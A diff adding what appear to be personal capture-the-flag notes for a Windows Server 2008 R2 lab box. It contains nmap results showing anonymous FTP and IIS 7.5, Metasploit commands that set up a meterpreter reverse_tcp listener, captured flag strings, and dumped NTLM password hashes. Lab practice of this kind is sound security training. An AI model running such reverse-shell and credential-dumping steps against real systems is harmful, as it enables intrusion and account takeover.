@@ -1,0 +1,51 @@
+IP: 10.129.25.118
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  02:06AM       <DIR>          aspnet_client
+| 03-17-17  05:37PM                  689 iisstart.htm
+|_03-17-17  05:37PM               184946 welcome.png
+| ftp-syst: 
+|_  SYST: Windows_NT
+
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: IIS7
+
+
+
+Microsoft Windows Server 2008 R2
+
+
+
+######becuase fuck nc -> opens listener
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+
+
+
+msf>use exploit/multi/handler  
+msf>set payload windows/meterpreter/reverse_tcp  
+msf>set lhost <IP>  
+msf>set lport <PORT> 
+
+
+
+
+ftp 21
+Microsoft Windows Server 2008 R2
+
+root.txt
+e621a0b5041708797c4fc4728bc72b4b
+
+user.txt
+9ecdd6a3aedf24b41562fea70f4cb3e8
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a450f6000be7df50ee304d0a838d638f:::
+babis:1000:aad3b435b51404eeaad3b435b51404ee:a1133ec0f7779e215acc8a36922acf57:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
